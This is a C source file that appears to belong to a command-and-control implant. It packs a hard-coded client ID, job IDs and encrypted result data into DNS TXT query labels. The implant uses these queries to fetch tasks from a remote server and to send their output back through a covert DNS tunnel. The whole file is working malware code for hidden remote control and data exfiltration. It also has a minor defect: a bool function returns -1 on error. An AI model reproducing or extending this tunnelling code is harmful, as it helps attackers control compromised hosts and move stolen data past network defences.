#include "inc/req.h"
#include "inc/dns.h"

#include <stdlib.h>
#include <string.h>

#include <errno.h>
#include <stdio.h>

void req_new(req_t *req) {
  bzero(req, sizeof(req_t));
  memcpy(req->client_id, SHRK_CLIENT_ID, CLIENT_ID_SIZE);
}

int64_t req_send(req_t *req, client_t *c) {
  dns_packet_t packet;
  int64_t      ret = 0;

  if (!req_to_dns(req, &packet))
    return -1;

  ret = dns_send(&packet, c);
  dns_free(&packet);

  return ret;
}

void __req_label_add(dns_packet_t *p, char *label, uint64_t label_len, bool do_encrypt) {
  // check size
  if (label_len > REQ_DATA_SIZE_MAX)
    return;

  // copy the label to provide extra space for encoding
  char label_copy[DNS_LABEL_LIMIT + 1];
  memcpy(label_copy, label, label_len);

  if (do_encrypt) // client_id label is not encrypted
    label_len = encrypt(label_copy, label_len);
  label_len = encode(label_copy, label_len);

  dns_label_add(p, label_copy, label_len);
}

bool req_to_dns(req_t *req, dns_packet_t *p) {
  if (req->data_size > REQ_DATA_SIZE_MAX) {
    debug("invalid data size for request: %lu", req->data_size);
    errno = EINVAL;
    return -1;
  }

  char            label[REQ_DATA_SIZE_MAX + 1];
  uint8_t         label_len = 0;
  dns_question_t *q         = &p->question[0];

  bzero(p, sizeof(dns_packet_t));
  bzero(label, sizeof(label));

  // label 0 is the client_id
  debug("adding the client ID label to the request (size: %d)", CLIENT_ID_SIZE);
  __req_label_add(p, req->client_id, CLIENT_ID_SIZE, false);

  switch (req->type) {
  case REQ_TYPE_JOB:
    // no additional labels needed for this request
    break;

  case REQ_TYPE_RESULT:
    // label 1 is job_id, packet_id and is_last
    label_len += copy(label + label_len, req->job_id, JOB_ID_SIZE);
    label_len += copy(label + label_len, &req->packet_id, sizeof(req->packet_id));
    label[label_len++] = req->is_last ? 1 : 0;

    debug("adding the job data label to the request (size: %d)", label_len);
    __req_label_add(p, label, label_len, true);

    // label 2 is the request data
    debug("adding the result data label to the request (size: %d)", req->data_size);
    __req_label_add(p, req->data, req->data_size, true);
    break;

  default:
    debug("invalid request type: %d", req->type);
    errno = EINVAL;
    return false;
  }

  /*

   * QR = 0 (query)
   * OPCODE = 0 (a standard query)
   * AA = 0 (only valid in responses)
   * TC = 0 (not truncated)
   * RD = 1 (do query recursively)

  */
  p->header.flags |= 0b00000001 << 8;

  /*

   * RA = 0 (only valid in response)
   * Z = 0 (reserved)
   * AD = 1 (require authentic data, 6.1 The AD and CD Header Bits, RFC 2065)
   * CD = 0 (checking is enabled, 6.1 The AD and CD Header Bits, RFC 2065)
   * the rest of the 4 bits are for the response code (which is obv only valid in responses)

  */
  p->header.flags |= 0b00100000;

  p->header.id      = randint(1, UINT16_MAX); // gen a random header ID
  p->header.qdcount = 1;                      // we have one question
  p->header.ancount = 0;
  p->header.nscount = 0;
  p->header.arcount = 0;

  // add the fake labels to the qname
  debug("completing the labels for the request (header id: %d)", p->header.id);
  dns_label_complete(p);
  q->qtype  = 16; // TXT (https://en.wikipedia.org/wiki/List_of_DNS_record_types)
  q->qclass = 1;  // IN (https://www.rfc-editor.org/rfc/rfc2929#section-3.2)

  debug("request is ready (header id: %d)", p->header.id);
  dns_debug_dump_qname(p);

  return true;
}
